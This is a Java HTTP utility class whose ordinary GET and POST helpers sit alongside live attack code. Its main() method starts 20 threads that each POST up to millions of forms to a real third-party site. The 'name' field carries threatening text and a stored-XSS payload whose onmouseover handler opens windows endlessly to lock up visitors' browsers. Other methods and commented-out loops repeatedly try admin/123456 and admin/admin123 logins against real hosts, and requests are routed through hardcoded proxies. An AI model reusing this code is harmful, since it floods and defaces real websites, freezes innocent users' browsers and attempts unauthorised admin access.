package com.smile.azxx.util;

import org.apache.commons.collections.MapUtils;
import org.apache.http.*;
import org.apache.http.client.config.RequestConfig;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClientBuilder;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URI;
import java.net.URL;
import java.util.*;
import java.util.logging.Logger;

/**
 * Created by smile on 2018/5/6.
 */
public class HttpClientUtil {

    private static Logger logger = Logger.getLogger(String.valueOf(HttpClientUtil.class));

    /**
     * get请求
     *
     * @return
     */
    public static String doGet(String url) {
        try {
            CloseableHttpClient client = HttpClients.createDefault();
            //发送get请求
            HttpGet request = new HttpGet(url);
            CloseableHttpResponse response = client.execute(request);

            /**请求发送成功，并得到响应**/
            if (response.getStatusLine().getStatusCode() == HttpStatus.SC_OK) {
                /**读取服务器返回过来的json字符串数据**/
                String strResult = EntityUtils.toString(response.getEntity());
                return strResult;
            } else {
                logger.info(response.getStatusLine().getStatusCode() + "");
            }
        } catch (IOException e) {
            e.printStackTrace();
            return "";
        }

        return null;
    }

    /**
     * post请求(用于key-value格式的参数)
     *
     * @param url
     * @param params
     * @return
     */
    public static String doPost(String url, Map params, Map header) {

        BufferedReader in = null;
        try {
            // 定义HttpClient
            CloseableHttpClient client = HttpClients.createDefault();
            // 实例化HTTP方法
            HttpPost request = new HttpPost();
            request.setURI(new URI(url));
            if (!MapUtils.isEmpty(header)) {
                for (Iterator iter = header.keySet().iterator(); iter.hasNext(); ) {
                    String name = (String) iter.next();
                    String value = String.valueOf(header.get(name));
                    request.addHeader(name, value);
                }
            }
            //设置参数
            List<NameValuePair> nvps = new ArrayList<>();
            if (!MapUtils.isEmpty(params)) {
                for (Iterator iter = params.keySet().iterator(); iter.hasNext(); ) {
                    String name = (String) iter.next();
                    String value = String.valueOf(params.get(name));
                    nvps.add(new BasicNameValuePair(name, value));
                }
            }
            request.setEntity(new UrlEncodedFormEntity(nvps, "UTF-8"));

            HttpResponse response = client.execute(request);
            int code = response.getStatusLine().getStatusCode();
            if (code == 200) {    //请求成功
                in = new BufferedReader(new InputStreamReader(response.getEntity()
                        .getContent(), "UTF-8"));
                StringBuffer sb = new StringBuffer("");
                String line = "";
                String NL = System.getProperty("line.separator");
                while ((line = in.readLine()) != null) {
                    sb.append(line + NL);
                }

                in.close();
                logger.info(sb.toString());
                return sb.toString();
            } else {   //
                logger.info("状态码：" + code);
                return null;
            }
        } catch (Exception e) {
            e.printStackTrace();

            return null;
        }
    }

    /**
     * post请求(用于key-value格式的参数)
     *
     * @param url
     * @param params
     * @return
     */
    public static String doPost(String url, Map params) {

        BufferedReader in = null;
        try {
            // 定义HttpClient
            CloseableHttpClient client = HttpClients.createDefault();
            // 实例化HTTP方法
//            HttpPost request = new HttpPost();
            HttpPost request = new HttpPost();

            request.setURI(new URI(url));
            //设置参数
            List<NameValuePair> nvps = new ArrayList<>();
            if (!MapUtils.isEmpty(params)) {
                for (Iterator iter = params.keySet().iterator(); iter.hasNext(); ) {
                    String name = (String) iter.next();
                    String value = String.valueOf(params.get(name));
                    nvps.add(new BasicNameValuePair(name, value));
                    //System.out.println(name +"-"+value);
                }
            }
            request.setEntity(new UrlEncodedFormEntity(nvps, "utf-8"));

            HttpResponse response = client.execute(request);
            int code = response.getStatusLine().getStatusCode();
            if (code == 200) {    //请求成功
                in = new BufferedReader(new InputStreamReader(response.getEntity()
                        .getContent(), "utf-8"));
                StringBuffer sb = new StringBuffer("");
                String line = "";
                String NL = System.getProperty("line.separator");
                while ((line = in.readLine()) != null) {
                    sb.append(line + NL);
                }

                in.close();
                System.out.println(sb.toString().substring(0, 50));
                return sb.toString();
            } else {   //
                System.out.println("状态码：" + code);
                return null;
            }
        } catch (Exception e) {
            e.printStackTrace();

            return null;
        }
    }


    public static String doPostProxy(String url, Map params,String targetUrl) {
        BufferedReader in = null;
        // 创建HttpClientBuilder
        HttpClientBuilder httpClientBuilder = HttpClientBuilder.create();
        // HttpClient
        CloseableHttpClient closeableHttpClient = httpClientBuilder.build();
        // 依次是目标请求地址，端口号,协议类型
//        HttpHost target = new HttpHost("www.e0ecr.cn", 80,
//                "http");
//        HttpHost target = new HttpHost("dcj2.cn", 80,
//                "http");
        HttpHost target = new HttpHost(targetUrl, 80,
                "http");
        // 依次是代理地址，代理端口号，协议类型
//        HttpHost proxy = new HttpHost("119.188.162.165", 8081, "http");//*
//        HttpHost proxy = new HttpHost("1.196.161.172", 9999, "http");
//        HttpHost proxy = new HttpHost("14.115.106.166", 9797, "http");
//        HttpHost proxy = new HttpHost("183.56.177.130", 808, "http");//**
        HttpHost proxy = new HttpHost("140.205.222.3", 80, "http");
//        HttpHost proxy = new HttpHost("183.56.177.130", 808, "http");//*
        RequestConfig config = RequestConfig.custom().setProxy(proxy)
                .setConnectTimeout(300000).setConnectionRequestTimeout(300000)
                .setSocketTimeout(300000).build();

        // 请求地址
        HttpPost httpPost = new HttpPost(url);
        httpPost.setConfig(config);
        // 创建参数队列
        List<NameValuePair> formparams = new ArrayList<NameValuePair>();
        // 参数名为pid，值是2
        //设置参数
        if (!MapUtils.isEmpty(params)) {
            for (Iterator iter = params.keySet().iterator(); iter.hasNext(); ) {
                String name = (String) iter.next();
                String value = String.valueOf(params.get(name));
                formparams.add(new BasicNameValuePair(name, value));
                //System.out.println(name +"-"+value);
            }
        }

        UrlEncodedFormEntity entity;
        try {
            entity = new UrlEncodedFormEntity(formparams, "gbk");
            httpPost.setEntity(entity);
            CloseableHttpResponse response = closeableHttpClient.execute(
                    target, httpPost);
            // getEntity()
            HttpEntity httpEntity = response.getEntity();
            int code = response.getStatusLine().getStatusCode();
            if (code == 200) {    //请求成功
                in = new BufferedReader(new InputStreamReader(httpEntity .getContent(), "gbk"));
                StringBuffer sb = new StringBuffer("");
                String line = "";
                String NL = System.getProperty("line.separator");
                while ((line = in.readLine()) != null) {
                    sb.append(line + NL);
                }

                in.close();
                System.out.println(sb.toString().substring(0,50));
                closeableHttpClient.close();
                return sb.toString();
            } else {   //
                System.out.println("状态码：" + code);
                closeableHttpClient.close();
                return null;
            }
            // 释放资源
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    /**
     * post请求（用于请求json格式的参数）
     *
     * @param url
     * @param params
     * @return
     */
    public static String doPost(String url, String params) throws Exception {

        CloseableHttpClient httpclient = HttpClients.createDefault();
        HttpPost httpPost = new HttpPost(url);// 创建httpPost
        httpPost.setHeader("Accept", "application/json");
        httpPost.setHeader("Content-Type", "application/json");
        String charSet = "UTF-8";
        StringEntity entity = new StringEntity(params, charSet);
        httpPost.setEntity(entity);
        CloseableHttpResponse response = null;

        try {

            response = httpclient.execute(httpPost);
            StatusLine status = response.getStatusLine();
            int state = status.getStatusCode();
            if (state == 200) {
                HttpEntity responseEntity = response.getEntity();
                String jsonString = EntityUtils.toString(responseEntity);
                return jsonString;
            } else {
                logger.info("请求返回:" + state + "(" + url + ")");
            }
        } finally {
            if (response != null) {
                try {
                    response.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            try {
                httpclient.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        return null;
    }

    static public void query() {
        //        String url = "http://www.3r1k.top/index.php?g=home&m=login&a=login";
        String url = "http://59.56.76.120:80/app/index.php?i=1&c=entry&do=login&m=mohutu";
        // 请求客户端及参数
        CloseableHttpClient client = HttpClients.createDefault();
        // Post请求
        HttpPost httppost = new HttpPost(url);
        //在这里我们给Post请求的头部加上User-Agent来伪装成微信内置浏览器
//        httppost.setHeader("User-Agent","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 MicroMessenger/6.5.2.501 NetType/WIFI WindowsWechat QBCore/3.43.691.400 QQBrowser/9.0.2524.400");
        //这个是在网上看到的，要加上这个，避免其他错误

        List<NameValuePair> list = new ArrayList<NameValuePair>();
        list.add(new BasicNameValuePair("user_name", "admin"));
        list.add(new BasicNameValuePair("user_pass", "123456"));
        //发送Post请求
        try {
            CloseableHttpResponse response = client.execute(httppost);
            HttpEntity responseEntity = response.getEntity();
            String jsonString = EntityUtils.toString(responseEntity);
//            System.out.println(jsonString);
        } catch (IOException e) {
            e.printStackTrace();
        }
        //.....获取response请求后其他的操作
    }

    public static void main(String[] args) {

        for (int j = 0; j < 20; j++) {
            System.out.println("线程：" + j);
            Thread thread = new Thread() {
                public void run() {
                    Map<String, String> map = new HashMap<>();
//                    map.put("userid",(1000+(int)(Math.random()*100+1))+"");

                    map.put("sj", "sb");
                    map.put("money", "SBSBSBSBSBS");
                    map.put("url", "2");


                    for (int i = 101000; i < 100000000; i++) {
                        String uid = new RandomGUID().getUUID32();
                        map.put("userid", (10000 + (int) (Math.random() * 200 + 1)) + "");
//                        map.put("userid",10003+"");
                        map.put("zykey", uid);
                        map.put("name", "老铁，准备跑路!每次跑路不告诉我我要报复" + i + uid + "1\"onmouseover=while(true){window.open(document.URL);}\"");
//                        map.put("name","做我们这个平台是一群SB！"+i+uid+"1\"onmouseover=alert(9619)\"");
                        System.out.println(map.get("userid"));
                        HttpClientUtil.doPost("http://xindinghui.xqx6.cn/pc/shipinto.php", map);
//                        HttpClientUtil.doPost("http://www.yuajcity.vip/dldl/shipinto.php",map);
                    }
                }
            };
            thread.start();
        }


//        HttpClientUtil.query();
//        int i =0;
//        while (i<1000000){
//            i++;
//            System.out.println(">>>>>>"+i);
//            Map<String,String> map = new HashMap<>();
//            map.put("username","admin");
//            map.put("password","admin123");
//            Thread thread = new Thread(){
//                public void run(){
//                    HttpClientUtil.doPost("http://xyschina.cn/app/index.php?i=1&c=entry&op=login&do=login&m=mohutu",map);
//                }
//            };
//            thread.start();
//        }
    }

    public static String getJsonData(String jsonParam, String urls) {
        StringBuffer sb = new StringBuffer();
        try {
            // 创建url资源
            URL url = new URL(urls);
            // 建立http连接
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            // 设置允许输出
            conn.setDoOutput(true);
            // 设置允许输入
            conn.setDoInput(true);
            // 设置不用缓存
            conn.setUseCaches(false);
            // 设置传递方式
            conn.setRequestMethod("POST");
            // 设置维持长连接
            conn.setRequestProperty("Connection", "Keep-Alive");
            // 设置文件字符集:
            conn.setRequestProperty("Charset", "UTF-8");
            // 转换为字节数组
            byte[] data = (jsonParam.toString()).getBytes();
            // 设置文件长度
            conn.setRequestProperty("Content-Length", String.valueOf(data.length));
            // 设置文件类型:
            conn.setRequestProperty("contentType", "application/json");
            // 开始连接请求
            conn.connect();
            OutputStream out = new DataOutputStream(conn.getOutputStream());
            // 写入请求的字符串
            out.write(jsonParam.getBytes());
            out.flush();
            out.close();

            logger.info(conn.getResponseCode() + "");

            // 请求返回的状态
            if (HttpURLConnection.HTTP_OK == conn.getResponseCode()) {
                logger.info("连接成功");
                // 请求返回的数据
                InputStream in1 = conn.getInputStream();
                try {
                    String readLine = new String();
                    BufferedReader responseReader = new BufferedReader(new InputStreamReader(in1, "UTF-8"));
                    while ((readLine = responseReader.readLine()) != null) {
//                        sb.append(readLine).append("\n");
                        sb.append(readLine);
                    }
                    responseReader.close();
                    logger.info(sb.toString());
                } catch (Exception e) {
                    e.printStackTrace();
                }
            } else {
                logger.info("error++");
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
        return sb.toString();
    }

    /**
     * post请求
     *
     * @param url
     * @param json
     * @return
     */
    public static String doPostJson(String url, String json) {
        CloseableHttpClient client = HttpClients.createDefault();
        HttpPost post = new HttpPost(url);
        String response = null;
        try {
            StringEntity s = new StringEntity(json.toString());
            s.setContentEncoding("UTF-8");
            s.setContentType("application/json");//发送json数据需要设置contentType
            post.setEntity(s);
            HttpResponse res = client.execute(post);
            if (res.getStatusLine().getStatusCode() == HttpStatus.SC_OK) {
                HttpEntity entity = res.getEntity();
                response = EntityUtils.toString(res.getEntity());// 返回json格式：
//                response = JSONObject.fromObject(result);
            }
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
        return response;
    }
}
